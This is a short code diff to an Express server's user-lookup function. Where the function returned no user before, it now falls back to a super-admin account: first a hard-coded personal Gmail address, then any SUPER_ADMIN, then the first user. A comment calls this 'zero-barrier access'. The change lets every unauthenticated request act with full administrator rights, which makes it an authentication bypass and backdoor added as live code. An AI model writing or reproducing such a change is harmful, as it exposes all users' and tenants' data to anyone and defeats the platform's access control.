@@ -32,7 +32,13 @@ async function startServer() {
       if (user) return user;
     }
 
-    return undefined;
+    // Default Super Admin fallback for seamless zero-barrier access
+    return (
+      dbStore.getUserByEmail('adminbreakthrough76@gmail.com') ||
+      dbStore.getUserByEmail('admin@platform.com') ||
+      dbStore.getAllUsers().find(u => u.role === 'SUPER_ADMIN') ||
+      dbStore.getAllUsers()[0]
+    );
   };
 
   const getEffectiveTenantId = (req: express.Request, user?: User): string => {
